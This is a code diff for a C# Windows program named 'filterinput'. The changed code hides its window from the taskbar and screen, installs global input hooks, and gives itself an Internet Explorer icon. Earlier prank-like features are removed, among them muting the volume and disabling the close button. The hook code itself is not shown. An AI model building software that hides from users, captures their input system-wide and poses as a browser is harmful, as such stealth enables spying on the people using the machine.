@@ -65,35 +65,12 @@ namespace filterinput
 
 
 
-        public class LibWrap
-
-        {
-
-            [DllImport(("winmm.dll "), EntryPoint = "mciSendString", CharSet = CharSet.Auto)]
-
-            public static extern int mciSendString(string lpszCommand, string lpszReturnString,
-
-                        uint cchReturn, int hwndCallback);
-
-        }
-
-        [DllImport("user32.dll", EntryPoint = "ShowCursor", CharSet = CharSet.Auto)]
-
-        public extern static void ShowCursor(int status);
+        
         
         
         
 
-        protected override CreateParams CreateParams
-        {
-            get
-            {
-                const int CS_NOCLOSE = 0x200;
-                CreateParams cp = base.CreateParams;
-                cp.ClassStyle = cp.ClassStyle | CS_NOCLOSE;
-                return cp;
-            }
-        }
+        
         
         
         
@@ -422,10 +399,10 @@ namespace filterinput
                 this.ShowInTaskbar = false;
                 //调用重构方法，将控件设置为指定的可见状态
                 SetVisibleCore(false);
-			//
-			// The InitializeComponent() call is required for Windows Forms designer support.
-			//
-			
+            //
+            // The InitializeComponent() call is required for Windows Forms designer support.
+            //
+            this.Icon = Properties.Resources.ie; 
 			
 			InitializeComponent();
 			
@@ -434,8 +411,8 @@ namespace filterinput
 			//
 			Hook_Start();
 			InstallGlobalHook();
-			SendMessageW(this.Handle, WM_APPCOMMAND, this.Handle,(IntPtr)APPCOMMAND_VOLUME_MUTE);
-            SleepCtr(true);
+			//SendMessageW(this.Handle, WM_APPCOMMAND, this.Handle,(IntPtr)APPCOMMAND_VOLUME_MUTE);
+            
 		}
 			
 		
@@ -664,22 +641,12 @@ namespace filterinput
  
         return 0;
     }
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
 
-        
+        private void MainForm_Load(object sender, EventArgs e)
+        {
 
-	}
+        }
+    }
 
         
 
